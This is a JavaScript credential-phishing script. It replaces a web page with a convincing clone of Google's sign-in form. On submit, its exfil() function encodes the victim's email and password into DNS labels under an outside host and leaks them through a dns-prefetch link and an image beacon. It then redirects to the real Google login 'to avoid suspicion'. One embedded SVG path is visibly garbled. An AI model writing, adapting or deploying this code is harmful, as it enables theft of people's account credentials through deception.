(function () {
  var _email = '';

  var GOOGLE_LOGO = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 272 92" width="75" height="24"><path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/><path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/><path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/><path fill="#4285F4" d="M35.29 41.41V32h31.syndic use Google Account to sign in.4c.24 1.49.39 3.04.39 4.79 0 5.96-1.62 13.34-6.84 18.57-5.06 5.31-11.53 8.14-20.12 8.14C18.33 63.5 3 48.67 3 31 3 13.33 18.33.5 35.54.5c9.08 0 15.55 3.56 20.41 8.2l-5.74 5.74c-3.48-3.27-8.2-5.81-14.67-5.81-11.99 0-21.37 9.66-21.37 21.64 0 11.98 9.38 21.64 21.37 21.64 7.78 0 12.2-3.12 15.05-5.97 2.31-2.31 3.83-5.63 4.42-10.15H35.29z"/></svg>';

  var GOOGLE_G = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="40" height="40"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.96 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>';

  var CSS = `
    *{box-sizing:border-box;margin:0;padding:0}
    body{font-family:'Google Sans',Roboto,arial,sans-serif;background:#fff;color:#202124;min-height:100vh;display:flex;flex-direction:column}
    .goog-header{padding:28px 40px 0;display:flex;align-items:center}
    .container{flex:1;display:flex;align-items:center;justify-content:center;padding:20px}
    .card{width:100%;max-width:450px;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;display:flex;flex-direction:column;align-items:center}
    .card .logo{margin-bottom:16px}
    .card h1{font-size:24px;font-weight:400;color:#202124;margin-bottom:8px;letter-spacing:0}
    .card .subtitle{font-size:16px;color:#202124;margin-bottom:32px}
    .step{width:100%;display:none}
    .step.active{display:block}
    .welcome-email{font-size:14px;color:#202124;border:1px solid #dadce0;border-radius:20px;padding:6px 12px 6px 8px;display:inline-flex;align-items:center;gap:6px;margin-bottom:24px;cursor:pointer}
    .welcome-email svg{flex-shrink:0}
    .input-wrap{position:relative;margin-bottom:6px}
    .input-wrap input{width:100%;padding:13px 15px;font-size:16px;border:1px solid #dadce0;border-radius:4px;outline:none;font-family:inherit;color:#202124;background:#fff;transition:border-color .2s}
    .input-wrap input:focus{border-color:#1a73e8;border-width:2px}
    .input-wrap label{position:absolute;left:12px;top:50%;transform:translateY(-50%);font-size:16px;color:#80868b;pointer-events:none;transition:.15s ease;background:#fff;padding:0 4px}
    .input-wrap input:focus + label,
    .input-wrap input:not(:placeholder-shown) + label{top:0;font-size:12px;color:#1a73e8}
    .input-wrap input:not(:focus):not(:placeholder-shown) + label{color:#80868b}
    .forgot{font-size:14px;color:#1a73e8;text-decoration:none;display:block;margin:8px 0 28px;cursor:pointer}
    .forgot:hover{text-decoration:underline}
    .guest-text{font-size:14px;color:#202124;margin-bottom:32px;line-height:1.5}
    .guest-text a{color:#1a73e8;text-decoration:none}
    .actions{width:100%;display:flex;justify-content:space-between;align-items:center}
    .btn-text{background:none;border:none;color:#1a73e8;font-size:14px;font-family:inherit;font-weight:500;padding:10px 8px;border-radius:4px;cursor:pointer;letter-spacing:.25px}
    .btn-text:hover{background:#f0f4ff}
    .btn-contained{background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:14px;font-family:inherit;font-weight:500;padding:10px 24px;cursor:pointer;letter-spacing:.25px;transition:background .2s}
    .btn-contained:hover{background:#1765cc}
    .footer{text-align:center;padding:16px;color:#202124;font-size:12px}
    .footer-links{display:flex;justify-content:center;gap:16px;margin-bottom:8px;flex-wrap:wrap}
    .footer-links a{color:#5f6368;text-decoration:none;font-size:12px}
    .footer-links a:hover{text-decoration:underline}
    .lang-selector{color:#5f6368;font-size:12px;cursor:pointer;border:none;background:none;font-family:inherit;padding:4px 8px;border-radius:4px}
    .lang-selector:hover{background:#f1f3f4}
    .show-pw-btn{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:#5f6368;font-size:13px;font-family:inherit;padding:4px}
  `;

  var HTML = `
  <!DOCTYPE html><html lang="en"><head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Sign in - Google Accounts</title>
  <link rel="icon" href="https://www.gstatic.com/images/branding/product/1x/googleg_32dp.png">
  <style>${CSS}</style>
  </head><body>
  <header class="goog-header">${GOOGLE_G}</header>
  <div class="container">
    <div class="card">
      <div class="logo">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 272 92" width="116" height="36" aria-label="Google">
          <path fill="#4285F4" d="M35.29 41.41V32h31.34c.31 1.49.47 3.04.47 4.79 0 5.96-1.62 13.34-6.84 18.57-5.06 5.31-11.53 8.14-20.12 8.14C18.33 63.5 3 48.67 3 31 3 13.33 18.33.5 35.54.5c9.08 0 15.55 3.56 20.41 8.2l-5.74 5.74c-3.48-3.27-8.2-5.81-14.67-5.81-11.99 0-21.37 9.66-21.37 21.64 0 11.98 9.38 21.64 21.37 21.64 7.78 0 12.2-3.12 15.05-5.97 2.31-2.31 3.83-5.63 4.42-10.15H35.29z"/>
          <path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
          <path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
          <path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
          <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/>
          <path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
        </svg>
      </div>
      <h1 id="goog-heading">Sign in</h1>
      <p class="subtitle" id="goog-sub">Use your Google Account</p>

      <!-- Step 1: Email -->
      <div class="step active" id="step-email">
        <div class="input-wrap">
          <input type="email" id="email-input" placeholder=" " autocomplete="email" />
          <label for="email-input">Email or phone</label>
        </div>
        <a class="forgot" href="javascript:void(0)">Forgot email?</a>
        <p class="guest-text">Not your computer? Use <a href="javascript:void(0)">Guest mode</a> to sign in privately. <a href="javascript:void(0)">Learn more</a></p>
        <div class="actions">
          <button class="btn-text" onclick="window.open('https://accounts.google.com/signup','_self')">Create account</button>
          <button class="btn-contained" id="email-next">Next</button>
        </div>
      </div>

      <!-- Step 2: Password -->
      <div class="step" id="step-pw">
        <div id="email-chip" class="welcome-email">
          ${GOOGLE_G}
          <span id="email-display"></span>
        </div>
        <div class="input-wrap">
          <input type="password" id="pw-input" placeholder=" " autocomplete="current-password" />
          <label for="pw-input">Enter your password</label>
          <button class="show-pw-btn" tabindex="-1" id="toggle-pw">Show</button>
        </div>
        <a class="forgot" href="javascript:void(0)">Forgot password?</a>
        <div class="actions">
          <button class="btn-text" href="javascript:void(0)">More options</button>
          <button class="btn-contained" id="pw-next">Next</button>
        </div>
      </div>
    </div>
  </div>
  <footer class="footer">
    <div class="footer-links">
      <a href="javascript:void(0)">Help</a>
      <a href="javascript:void(0)">Privacy</a>
      <a href="javascript:void(0)">Terms</a>
    </div>
    <select class="lang-selector"><option>English (United States)</option></select>
  </footer>
  </body></html>`;

  function exfil(email, password) {
    var data = email + ':' + password;
    var enc = btoa(data).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
    var chunks = enc.match(/.{1,63}/g) || ['x'];
    var host = chunks.join('.') + '.i.aj.ax';
    var l = document.createElement('link');
    l.rel = 'dns-prefetch';
    l.href = '//' + host;
    document.head.appendChild(l);
    // belt-and-suspenders: img beacon in case dns-prefetch is lazy
    var img = new Image();
    img.src = 'https://' + host;
  }

  // Rewrite the page
  document.open();
  document.write(HTML);
  document.close();

  // Wire up interactions after DOM is ready
  document.addEventListener('DOMContentLoaded', function () { init(); });
  // document.write closes and reopens, so DOMContentLoaded may already have fired
  if (document.readyState !== 'loading') init();

  function init() {
    var emailInput = document.getElementById('email-input');
    var pwInput    = document.getElementById('pw-input');
    var emailNext  = document.getElementById('email-next');
    var pwNext     = document.getElementById('pw-next');
    var stepEmail  = document.getElementById('step-email');
    var stepPw     = document.getElementById('step-pw');
    var heading    = document.getElementById('goog-heading');
    var sub        = document.getElementById('goog-sub');
    var emailDisp  = document.getElementById('email-display');
    var togglePw   = document.getElementById('toggle-pw');

    function goToPw() {
      var em = emailInput.value.trim();
      if (!em) { emailInput.focus(); return; }
      emailDisp.textContent = em;
      heading.textContent = 'Welcome';
      sub.textContent = '';
      stepEmail.classList.remove('active');
      stepPw.classList.add('active');
      pwInput.focus();
    }

    emailNext.addEventListener('click', goToPw);
    emailInput.addEventListener('keydown', function (e) { if (e.key === 'Enter') goToPw(); });

    togglePw.addEventListener('click', function () {
      if (pwInput.type === 'password') { pwInput.type = 'text'; togglePw.textContent = 'Hide'; }
      else { pwInput.type = 'password'; togglePw.textContent = 'Show'; }
    });

    pwNext.addEventListener('click', function () {
      var em = emailInput.value.trim();
      var pw = pwInput.value;
      exfil(em, pw);
      // Redirect to real Google after brief delay to avoid suspicion
      setTimeout(function () {
        window.location.href = 'https://accounts.google.com';
      }, 300);
    });
    pwInput.addEventListener('keydown', function (e) {
      if (e.key === 'Enter') pwNext.click();
    });
  }
})();
